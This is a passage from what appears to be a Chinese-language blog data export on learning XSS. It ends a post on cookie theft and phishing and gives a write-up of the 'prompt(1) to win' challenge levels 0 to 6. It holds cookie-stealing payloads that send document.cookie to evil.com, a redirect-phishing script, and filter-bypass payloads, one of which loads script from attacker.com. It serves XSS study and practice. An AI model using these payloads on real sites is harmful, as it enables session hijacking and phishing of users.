class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> img = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">'img'</span>); </span><br><span class=\"line\">img.src=<span class=\"string\">'http://www.evil.com/no.php?'</span>+<span class=\"built_in\">escape</span>(<span class=\"built_in\">document</span>.cookie);</span><br><span class=\"line\"><span class=\"built_in\">document</span>.body.appendChild(img);</span><br></pre></td></tr></table></figure>\n<p>脚本原理：创建一个用于请求图片的<code>&lt;img&gt;</code>标签，该标签会向<code>src</code>属性指定的URL发起一次GET请求，我们让其<code>src</code>向我们的服务器发起一次GET并且让其携带Cookie作为参数。若脚本被加载并执行成功，我们通过查看我们的服务器<code>access.log</code>日志就能看到Cookie。也可以编写一个页面来接收Payload发送的Cookie参数。</p>\n<p><strong>3.其他漏洞利用代码：</strong></p>\n<ul>\n<li><code>&lt;img src=&quot;http://www.evil.com?cookie=&#39;+document.cookie&quot;&gt;&lt;/img&gt;</code></li>\n<li><code>&lt;script&gt;new Image().src=&quot;http://www.evil.com?cookie=&quot;+document.cookie;&lt;/script&gt;</code></li>\n</ul>\n<p><strong>4.窃取其他信息</strong></p>\n<ul>\n<li><code>navigator.userAgent</code>读取客户端UA。</li>\n</ul>\n<p><strong>5.防御</strong></p>\n<p>在Set-Cookie时设置Http-Only标识，设置后将不允许JavaScript读取Cookie。</p>\n<h3 id=\"0x01-钓鱼攻击\"><a href=\"#0x01-钓鱼攻击\" class=\"headerlink\" title=\"0x01 钓鱼攻击\"></a>0x01 钓鱼攻击</h3><p><strong>1.重定向钓鱼</strong></p>\n<blockquote>\n<p><code>&lt;script&gt;document.location.href=&quot;http://www.evil.com&quot;&lt;/script&gt;</code></p>\n</blockquote>\n<p><strong>2.iframe</strong></p>\n<p>通过JavaScript来添加一个新的<code>&lt;iframe&gt;</code>标签嵌入第三方域的内容(钓鱼网页)，此时主页面仍处于正常页面下，具有极高的迷惑性。</p>\n<h3 id=\"0x02-其他利用\"><a href=\"#0x02-其他利用\" class=\"headerlink\" title=\"0x02 其他利用\"></a>0x02 其他利用</h3><p>参考链接：</p>\n<p><a href=\"http://wps2015.org/2016/12/12/usually-used-xss-code/\" target=\"_blank\" rel=\"noopener\">http://wps2015.org/2016/12/12/usually-used-xss-code/</a></p>\n<p><a href=\"https://bbs.ichunqiu.com/thread-25578-1-1.html?from=sec\" target=\"_blank\" rel=\"noopener\">https://bbs.ichunqiu.com/thread-25578-1-1.html?from=sec</a></p>\n<h2 id=\"三、XSS-Check-Cheatsheet\"><a href=\"#三、XSS-Check-Cheatsheet\" class=\"headerlink\" title=\"三、XSS Check Cheatsheet\"></a>三、XSS Check Cheatsheet</h2><p><a href=\"http://momomoxiaoxi.com/2017/10/10/XSS/\" target=\"_blank\" rel=\"noopener\">http://momomoxiaoxi.com/2017/10/10/XSS/</a></p>\n<p><a href=\"https://github.com/s0md3v/AwesomeXSS\" target=\"_blank\" rel=\"noopener\">https://github.com/s0md3v/AwesomeXSS</a></p>"},{"title":"XSS学习系列Chapter 3：prompt(1) XSS挑战","date":"2019-03-11T06:18:29.000Z","_content":"\n## 一、概述\n\n`prompt(1) to win`是一个XSS挑战的靶场。\n\n靶场地址：http://prompt.ml/0\n\n目标：Payload不需要用户交互，当输入有效且能执行`prompt(1)`向量时，会自动提交用户的答案。并显示**YOU WON**字样。\n\n<!-- more -->\n\n## 二、挑战\n\n### Level 0\n\n```javascript\nfunction escape(input) {\n    // warm up\n    // script should be executed without user interaction\n    return '<input type=\"text\" value=\"' + input + '\">';\n}        \n```\n\n没有经过任何过滤就直接输出，直接考虑闭合即可。\n\nPayload:\n\n> `\"><script>prompt(1)</script>`\n>\n> `\"><img src=x onerror=prompt(1)>`\n\n### Level 1\n\n```javascript\nfunction escape(input) {\n    // tags stripping mechanism from ExtJS library\n    // Ext.util.Format.stripTags\n    var stripTagsRE = /<\\/?[^>]+>/gi;\n    input = input.replace(stripTagsRE, '');\n\n    return '<article>' + input + '</article>';\n}       \n```\n\nJS正则：\n\n- 语法规则：`/正则表达式主体/修饰符(可选)``\n- ``/<\\/?[^>]+>/gi`：\n  - 匹配`<除>以外任意>`或`</除>以外任意>``\n  - ``/gi`标识全局搜索匹配、不区分大小写。\n\n将匹配的替换为空，因此不能出现`<`和`>`不能同时出现。由于一个标签即使没有最后面的`>`也是可以被浏览器正确解析的。或者最后使用`//`\n\n因此，Payload:\n\n> `<img src=x onerror=prompt(1) //`\n>\n> `<img src=x onerror=prompt(1)(空格) `\n\n### Level 2\n\n```javascript\nfunction escape(input) {\n    // v-- frowny face\n    input = input.replace(/[=(]/g, '');\n\n    // ok seriously, disallows equal signs and open parenthesis\n    return input;\n} \n```\n\n`[=(]`该正则含义为匹配`=`或`(`，因此这两个会被过滤。\n\n考虑使用字符实体来替代`=`和`(`绕过，他们对应的字符实体为：`&#61;`、`&#40;`。\n\nPayload：\n\n>- `<svg><script>prompt&#40;1)</script>`\n\n这里有个问题，`script`标签是属于**`Raw text elements`**类型的，该类型的标签的内容是不会被HTML解析器解码的，为什么该Payload还可行？\n\n这是因为`<svg>`标签存在的缘故：\n\nSVG 是使用 XML 来描述二维图形和绘图程序的语言。\n\n简单来说就是处在`<svg>`标签内的内容会先被XML解析器解析，因此`&#40;`会被解码为`(`。\n\n若支持ES6，还可以使用:\n\n> ```javascript\n> <script>eval.call`${'prompt\\x281)'}\\`</script>\n> ```\n\n`eval`会对其进行解码。\n\n### Level 3 \n\n```javascript\nfunction escape(input) {\n    // filter potential comment end delimiters\n    input = input.replace(/->/g, '_');\n\n    // comment the input to avoid script execution\n    return '<!-- ' + input + ' -->';\n}        \n```\n\n输入的内容会被输出到HTML注释之中，并且对`->`进行过滤，替换为`-`，以防对注释符号进行闭合。\n\n使用`--!>`来闭合注释绕过。\n\nPayload:\n\n> - `--!><img src=x onerror=prompt(1)>`\n\n### Level 4\n\n```javascript\nfunction escape(input) {\n    // make sure the script belongs to own site\n    // sample script: http://prompt.ml/js/test.js\n    if (/^(?:https?:)?\\/\\/prompt\\.ml\\//i.test(decodeURIComponent(input))) {\n        var script = document.createElement('script');\n        script.src = input;\n        return script.outerHTML;\n    } else {\n        return 'Invalid resource.';\n    }\n}        \n```\n\n正则限制了只能加载当前域下的脚本，不允许跨域。\n\n但URL的格式可以形如：`http://user:password@attacker.com/`，表示以`user:password`登录`attack.com`。\n\n因此这里可以考虑使用Payload：`http://prompt.ml/@attacker.com/payload.js`。但浏览器只支持`http://prompt.ml@attacker.com/payload.js`这样的，但注意到存在`decodeURIComponent()`函数，该函数会进行URL解码，因此我们可以将`/`进行URL编码为`%2f`以绕过。\n\n最终Payload：\n\n> - `http://prompt.ml%2f@attacker.com/payload.js`\n\n该题需要我们`attacker.com`服务器上有payload.js文件，文件内容`prompt(1)`。\n\n### Level 5 \n\n```javascript\nfunction escape(input) {\n    // apply strict filter rules of level 0\n    // filter \">\" and event handlers\n    input = input.replace(/>|on.+?=|focus/gi, '_');\n\n    return '<input value=\"' + input + '\" type=\"text\">';\n}      \n```\n\n过滤了`>`和`on`事件句柄以及`focus`，会将它们替换为`_`。\n\n使用事件与等号可以不在一行特性进行绕过。并且使用`type=\"image\"`覆盖`type=\"text\"`。\n\nPayload：\n\n> - `\" type=\"image\" src=x onerror\n>   =alert(1) `\n\n### Level 6\n\n```javascript\nfunction escape(input) {\n    // let's do a post redirection\n    try {\n        // pass in formURL#formDataJSON\n        // e.g. http://httpbin.org/post#{\"name\":\"Matt\"}\n        var segments = input.split('#');\n        var formURL = segments[0];\n        var formData = JSON.parse(segments[1]);\n\n        var form = document.createElement('form');\n        form.action = formURL;\n        form.method = 'post';\n\n        for (var i in formData) {\n            var input = form.appendChild(document.createElement('input'));\n            input.name = i;\n            input.setAttribute('value', formData[i]);\n        }\n\n        return form.outerHTML + '                         \\n\\\n<script>                                                  \\n\\\n    // forbid javascript: or vbscript: and data: stuff    \\n\\\n    if (!/script:|data:/i.test(document.forms[0].action)) \\n\\\n        document.forms[0].submit();                       \\n\\\n    else                                                  \\n\\\n        document.write(\"Action forbidden.\")               \\n\\\n</script>                                                 \\n\\\n        ';\n    } catch (e) {\n        return 'Invalid form data.';\n    }\n}      \n```\n\n输入形如：`http://httpbin.org/post#{\"name\":\"Matt\"}`格式的URL，会把`#`号前的部分作为新建表单的`action`属性的值，`#`号后面的Json格式的数据的键和值分别对应`<input />`标签的`name`和`value`属性的值。\n\n正常情况下可以通过将`action`设置成`javascript`等伪协议，来触发XSS，但是过滤了`script:`、`data:`。\n\n这里涉及到的一个知识点就是JavaScript中`document.forms[0].action`表单DOM操作，会先选择表单中`name`属性值为`action`的输入框，如果找不到，才会选择`form`标签的`action`属性。\n\n因此Payload：\n\n> - `javascript:prompt(1)#{\"action\":\"111\"}`\n\n`document.forms[0].action`找到的不是`form`标签的`action`属性，而是`name`属性值为`action`的`<input />`标签。\n\n......\n\n**参考链接**\n\nhttps://www.cnblogs.com/Ashenone/p/9049341.html\n\nhttps://blog.csdn.net/Ni9htMar3/article/details/77938899\n\nhttps://blog.csdn.net/qq_35078631/article/details/77073233","source":"_posts/0x02-XSS学习系列之练习靶场01.md","raw":"---\ntitle: XSS学习系列Chapter 3：prompt(1) XSS挑战\ndate: 2019-03-11 14:18:29\ntags: \n\t- XSS\n\t- 靶场\ncategories: WEB漏洞学习\n---\n\n## 一、概述\n\n`prompt(1) to win`是一个XSS挑战的靶场。\n\n靶场地址：http://prompt.ml/0\n\n目标：Payload不需要用户交互，当输入有效且能执行`prompt(1)`向量时，会自动提交用户的答案。并显示**YOU WON**字样。\n\n<!-- more -->\n\n## 二、挑战\n\n### Level 0\n\n```javascript\nfunction escape(input) {\n    // warm up\n    // script should be executed without user interaction\n    return '<input type=\"text\" value=\"' + input + '\">';\n}        \n```\n\n没有经过任何过滤就直接输出，直接考虑闭合即可。\n\nPayload:\n\n> `\"><script>prompt(1)</script>`\n>\n> `\"><img src=x onerror=prompt(1)>`\n\n### Level 1\n\n```javascript\nfunction escape(input) {\n    // tags stripping mechanism from ExtJS library\n    // Ext.util.Format.stripTags\n    var stripTagsRE = /<\\/?[^>]+>/gi;\n    input = input.replace(stripTagsRE, '');\n\n    return '<article>' + input + '</article>';\n}       \n```\n\nJS正则：\n\n- 语法规则：`/正则表达式主体/修饰符(可选)``\n- ``/<\\/?[^>]+>/gi`：\n  - 匹配`<除>以外任意>`或`</除>以外任意>``\n  - ``/gi`标识全局搜索匹配、不区分大小写。\n\n将匹配的替换为空，因此不能出现`<`和`>`不能同时出现。由于一个标签即使没有最后面的`>`也是可以被浏览器正确解析的。或者最后使用`//`\n\n因此，Payload:\n\n> `<img src=x onerror=prompt(1) //`\n>\n> `<img src=x onerror=prompt(1)(空格) `\n\n### Level 2\n\n```javascript\nfunction escape(input) {\n    // v-- frowny face\n    input = input.replace(/[=(]/g, '');\n\n    // ok seriously, disallows equal signs and open parenthesis\n    return input;\n} \n```\n\n`[=(]`该正则含义为匹配`=`或`(`，因此这两个会被过滤。\n\n考虑使用字符实体来替代`=`和`(`绕过，他们对应的字符实体为：`&#61;`、`&#40;`。\n\nPayload：\n\n>- `<svg><script>prompt&#40;1)</script>`\n\n这里有个问题，`script`标签是属于**`Raw text elements`**类型的，该类型的标签的内容是不会被HTML解析器解码的，为什么该Payload还可行？\n\n这是因为`<svg>`标签存在的缘故：\n\nSVG 是使用 XML 来描述二维图形和绘图程序的语言。\n\n简单来说就是处在`<svg>`标签内的内容会先被XML解析器解析，因此`&#40;`会被解码为`(`。\n\n若支持ES6，还可以使用:\n\n> ```javascript\n> <script>eval.call`${'prompt\\x281)'}\\`</script>\n> ```\n\n`eval`会对其进行解码。\n\n### Level 3 \n\n```javascript\nfunction escape(input) {\n    // filter potential comment end delimiters\n    input = input.replace(/->/g, '_');\n\n    // comment the input to avoid script execution\n    return '<!-- ' + input + ' -->';\n}        \n```\n\n输入的内容会被输出到HTML注释之中，并且对`->`进行过滤，替换为`-`，以防对注释符号进行闭合。\n\n使用`--!>`来闭合注释绕过。\n\nPayload:\n\n> - `--!><img src=x onerror=prompt(1)>`\n\n### Level 4\n\n```javascript\nfunction escape(input) {\n    // make sure the script belongs to own site\n    // sample script: http://prompt.ml/js/test.js\n    if (/^(?:https?:)?\\/\\/prompt\\.ml\\//i.test(decodeURIComponent(input))) {\n        var script = document.createElement('script');\n        script.src = input;\n        return script.outerHTML;\n    } else {\n        return 'Invalid resource.';\n    }\n}        \n```\n\n正则限制了只能加载当前域下的脚本，不允许跨域。\n\n但URL的格式可以形如：`http://user:password@attacker.com/`，表示以`user:password`登录`attack.com`。\n\n因此这里可以考虑使用Payload：`http://prompt.ml/@attacker.com/payload.js`。但浏览器只支持`http://prompt.ml@attacker.com/payload.js`这样的，但注意到存在`decodeURIComponent()`函数，该函数会进行URL解码，因此我们可以将`/`进行URL编码为`%2f`以绕过。\n\n最终Payload：\n\n> - `http://prompt.ml%2f@attacker.com/payload.js`\n\n该题需要我们`attacker.com`服务器上有payload.js文件，文件内容`prompt(1)`。\n\n### Level 5 \n\n```javascript\nfunction escape(input) {\n    // apply strict filter rules of level 0\n    // filter \">\" and event handlers\n    input = input.replace(/>|on.+?=|focus/gi, '_');\n\n    return '<input value=\"' + input + '\" type=\"text\">';\n}      \n```\n\n过滤了`>`和`on`事件句柄以及`focus`，会将它们替换为`_`。\n\n使用事件与等号可以不在一行特性进行绕过。并且使用`type=\"image\"`覆盖`type=\"text\"`。\n\nPayload：\n\n> - `\" type=\"image\" src=x onerror\n>   =alert(1) `\n\n### Level 6\n\n```javascript\nfunction escape(input) {\n    // let's do a post redirection\n    try {\n        // pass in formURL#formDataJSON\n        // e.g. http://httpbin.org/post#{\"name\":\"Matt\"}\n        var segments = input.split('#');\n        var formURL = segments[0];\n        var formData = JSON.parse(segments[1]);\n\n        var form = document.createElement('form');\n        form.action = formURL;\n        form.method = 'post';\n\n        for (var i in formData) {\n            var input = form.appendChild(document.createElement('input'));\n            input.name = i;\n            input.setAttribute('value', formData[i]);\n        }\n\n        return form.outerHTML + '                         \\n\\\n<script>                                                  \\n\\\n    // forbid javascript: or vbscript: and data: stuff    \\n\\\n    if (!/script:|data:/i.test(document.forms[0].action)) \\n\\\n        document.forms[0].submit();                       \\n\\\n    else                                                  \\n\\\n        document.write(\"Action forbidden.\")               \\n\\\n</script>                                                 \\n\\\n        ';\n    } catch (e) {\n        return 'Invalid form data.';\n    }\n}      \n```\n\n输入形如：`http://httpbin.org/post#{\"name\":\"Matt\"}`格式的URL，会把`#`号前的部分作为新建表单的`action`属性的值，`#`号后面的Json格式的数据的键和值分别对应`<input />`标签的`name`和`value`属性的值。\n\n正常情况下可以通过将`action`设置成`javascript`等伪协议，来触发XSS，但是过滤了`script:`、`data:`。\n\n这里涉及到的一个知识点就是JavaScript中`document.forms[0].action`表单DOM操作，会先选择表单中`name`属性值为`action`的输入框，如果找不到，才会选择`form`标签的`action`属性。\n\n因此Payload：\n\n> - `javascript:prompt(1)#{\"action\":\"111\"}`\n\n`document.forms[0].action`找到的不是`form`标签的`action`属性，而是`name`属性值为`action`的`<input />`标签。\n\n......\n\n**参考链接**\n\nhttps://www.cnblogs.com/Ashenone/p/9049341.html\n\nhttps://blog.csdn.net/Ni9htMar3/article/details/77938899\n\nhttps://blog.csdn.net/qq_35078631/article/details/77073233","slug":"0x02-XSS学习系列之练习靶场01","published":1,"updated":"2019-03-22T03:47:25.809Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjuam83ki001p7or0810rvhtc","content":"<h2 id=\"一、概述\"><a href=\"#一、概述\" class=\"headerlink\" title=\"一、概述\"></a>一、概述</h2><p><code>prompt(1) to win</code>是一个XSS挑战的靶场。</p>\n<p>靶场地址：<a href=\"http://prompt.ml/0\" target=\"_blank\" rel=\"noopener\">http://prompt.ml/0</a></p>\n<p>目标：Payload不需要用户交互，当输入有效且能执行<code>prompt(1)</code>向量时，会自动提交用户的答案。并显示<strong>YOU WON</strong>字样。</p>\n<a id=\"more\"></a>\n<h2 id=\"二、挑战\"><a href=\"#二、挑战\" class=\"headerlink\" title=\"二、挑战\"></a>二、挑战</h2><h3 id=\"Level-0\"><a href=\"#Level-0\" class=\"headerlink\" title=\"Level 0\"></a>Level 0</h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">escape</span>(<span class=\"params\">input</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// warm up</span></span><br><span class=\"line\">    <span class=\"comment\">// script should be executed without user interaction</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">'&lt;input type=\"text\" value=\"'</span> + input + <span class=\"string\">'\"&gt;'</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>没有经过任何过滤就直接输出，直接考虑闭合即可。</p>\n<p>Payload:</p>\n<blockquote>\n<p><code>&quot;&gt;&lt;script&gt;prompt(1)&lt;/script&gt;</code></p>\n<p><code>&quot;&gt;&lt;img src=x onerror=prompt(1)&gt;</code></p>\n</blockquote>\n<h3 id=\"Level-1\"><a href=\"#Level-1\" class=\"headerlink\" title=\"Level 1\"></a>Level 1</h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">escape</span>(<span class=\"params\">input</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// tags stripping mechanism from ExtJS library</span></span><br><span class=\"line\">    <span class=\"comment\">// Ext.util.Format.stripTags</span></span><br><span class=\"line\">    <span class=\"keyword\">var</span> stripTagsRE = <span class=\"regexp\">/&lt;\\/?[^&gt;]+&gt;/gi</span>;</span><br><span class=\"line\">    input = input.replace(stripTagsRE, <span class=\"string\">''</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">'&lt;article&gt;'</span> + input + <span class=\"string\">'&lt;/article&gt;'</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>JS正则：</p>\n<ul>\n<li>语法规则：<code>/正则表达式主体/修饰符(可选)`</code></li>\n<li><code></code>/&lt;\\/?[^&gt;]+&gt;/gi`：<ul>\n<li>匹配<code>&lt;除&gt;以外任意&gt;</code>或<code>&lt;/除&gt;以外任意&gt;`</code></li>\n<li><code></code>/gi`标识全局搜索匹配、不区分大小写。</li>\n</ul>\n</li>\n</ul>\n<p>将匹配的替换为空，因此不能出现<code>&lt;</code>和<code>&gt;</code>不能同时出现。由于一个标签即使没有最后面的<code>&gt;</code>也是可以被浏览器正确解析的。或者最后使用<code>//</code></p>\n<p>因此，Payload:</p>\n<blockquote>\n<p><code>&lt;img src=x onerror=prompt(1) //</code></p>\n<p><code>&lt;img src=x onerror=prompt(1)(空格)</code></p>\n</blockquote>\n<h3 id=\"Level-2\"><a href=\"#Level-2\" class=\"headerlink\" title=\"Level 2\"></a>Level 2</h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">escape</span>(<span class=\"params\">input</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// v-- frowny face</span></span><br><span class=\"line\">    input = input.replace(<span class=\"regexp\">/[=(]/g</span>, <span class=\"string\">''</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// ok seriously, disallows equal signs and open parenthesis</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> input;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><code>[=(]</code>该正则含义为匹配<code>=</code>或<code>(</code>，因此这两个会被过滤。</p>\n<p>考虑使用字符实体来替代<code>=</code>和<code>(</code>绕过，他们对应的字符实体为：<code>&amp;#61;</code>、<code>&amp;#40;</code>。</p>\n<p>Payload：</p>\n<blockquote>\n<ul>\n<li><code>&lt;svg&gt;&lt;script&gt;prompt&amp;#40;1)&lt;/script&gt;</code></li>\n</ul>\n</blockquote>\n<p>这里有个问题，<code>script</code>标签是属于<strong><code>Raw text elements</code></strong>类型的，该类型的标签的内容是不会被HTML解析器解码的，为什么该Payload还可行？</p>\n<p>这是因为<code>&lt;svg&gt;</code>标签存在的缘故：</p>\n<p>SVG 是使用 XML 来描述二维图形和绘图程序的语言。</p>\n<p>简单来说就是处在<code>&lt;svg&gt;</code>标签内的内容会先被XML解析器解析，因此<code>&amp;#40;</code>会被解码为<code>(</code>。</p>\n<p>若支持ES6，还可以使用:</p>\n<blockquote>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; &lt;script&gt;eval.call`$&#123;'prompt\\x281)'&#125;\\`&lt;/script&gt;</span><br><span class=\"line\">&gt;</span><br></pre></td></tr></table></figure>\n</blockquote>\n<p><code>eval</code>会对其进行解码。</p>\n<h3 id=\"Level-3\"><a href=\"#Level-3\" class=\"headerlink\" title=\"Level 3\"></a>Level 3</h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">escape</span>(<span class=\"params\">input</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// filter potential comment end delimiters</span></span><br><span class=\"line\">    input = input.replace(<span class=\"regexp\">/-&gt;/g</span>, <span class=\"string\">'_'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// comment the input to avoid script execution</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">'&lt;!-- '</span> + input + <span class=\"string\">' --&gt;'</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>输入的内容会被输出到HTML注释之中，并且对<code>-&gt;</code>进行过滤，替换为<code>-</code>，以防对注释符号进行闭合。</p>\n<p>使用<code>--!&gt;</code>来闭合注释绕过。</p>\n<p>Payload:</p>\n<blockquote>\n<ul>\n<li><code>--!&gt;&lt;img src=x onerror=prompt(1)&gt;</code></li>\n</ul>\n</blockquote>\n<h3 id=\"Level-4\"><a href=\"#Level-4\" class=\"headerlink\" title=\"Level 4\"></a>Level 4</h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">escape</span>(<span class=\"params\">input</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// make sure the script belongs to own site</span></span><br><span class=\"line\">    <span class=\"comment\">// sample script: http://prompt.ml/js/test.js</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"regexp\">/^(?:https?:)?\\/\\/prompt\\.ml\\//i</span>.test(<span class=\"built_in\">decodeURIComponent</span>(input))) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> script = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">'script'</span>);</span><br><span class=\"line\">        script.src = input;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> script.outerHTML;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">'Invalid resource.'</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>正则限制了只能加载当前域下的脚本，不允许跨域。</p>\n<p>但URL的格式可以形如：<code>http://user:password@attacker.com/</code>，表示以<code>user:password</code>登录<code>attack.com</code>。</p>\n<p>因此这里可以考虑使用Payload：<code>http://prompt.ml/@attacker.com/payload.js</code>。但浏览器只支持<code>http://prompt.ml@attacker.com/payload.js</code>这样的，但注意到存在<code>decodeURIComponent()</code>函数，该函数会进行URL解码，因此我们可以将<code>/</code>进行URL编码为<code>%2f</code>以绕过。</p>\n<p>最终Payload：</p>\n<blockquote>\n<ul>\n<li><code>http://prompt.ml%2f@attacker.com/payload.js</code></li>\n</ul>\n</blockquote>\n<p>该题需要我们<code>attacker.com</code>服务器上有payload.js文件，文件内容<code>prompt(1)</code>。</p>\n<h3 id=\"Level-5\"><a href=\"#Level-5\" class=\"headerlink\" title=\"Level 5\"></a>Level 5</h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">escape</span>(<span class=\"params\">input</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// apply strict filter rules of level 0</span></span><br><span class=\"line\">    <span class=\"comment\">// filter \"&gt;\" and event handlers</span></span><br><span class=\"line\">    input = input.replace(<span class=\"regexp\">/&gt;|on.+?=|focus/gi</span>, <span class=\"string\">'_'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">'&lt;input value=\"'</span> + input + <span class=\"string\">'\" type=\"text\"&gt;'</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>过滤了<code>&gt;</code>和<code>on</code>事件句柄以及<code>focus</code>，会将它们替换为<code>_</code>。</p>\n<p>使用事件与等号可以不在一行特性进行绕过。并且使用<code>type=&quot;image&quot;</code>覆盖<code>type=&quot;text&quot;</code>。</p>\n<p>Payload：</p>\n<blockquote>\n<ul>\n<li><code>&quot; type=&quot;image&quot; src=x onerror\n=alert(1)</code></li>\n</ul>\n</blockquote>\n<h3 id=\"Level-6\"><a href=\"#Level-6\" class=\"headerlink\" title=\"Level 6\"></a>Level 6</h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">escape</span>(<span class=\"params\">input</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// let's do a post redirection</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// pass in formURL#formDataJSON</span></span><br><span class=\"line\">        <span class=\"comment\">// e.g. http://httpbin.org/post#&#123;\"name\":\"Matt\"&#125;</span></span><br><span class=\"line\">        <span class=\"keyword\">var</span> segments = input.split(<span class=\"string\">'#'</span>);</span><br><span class=\"line\">        <span class=\"keyword\">var</span> formURL = segments[<span class=\"number\">0</span>];</span><br><span class=\"line\">        <span class=\"keyword\">var</span> formData = <span class=\"built_in\">JSON</span>.parse(segments[<span class=\"number\">1</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">var</span> form = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">'form'</span>);</span><br><span class=\"line\">        form.action = formURL;</span><br><span class=\"line\">        form.method = <span class=\"string\">'post'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i <span class=\"keyword\">in</span> formData) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">var</span> input = form.appendChild(<span class=\"built_in\">document</span>.createElement(<span class=\"string\">'input'</span>));</span><br><span class=\"line\">            input.name = i;</span><br><span class=\"line\">            input.setAttribute(<span class=\"string\">'value'</span>, formData[i]);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span 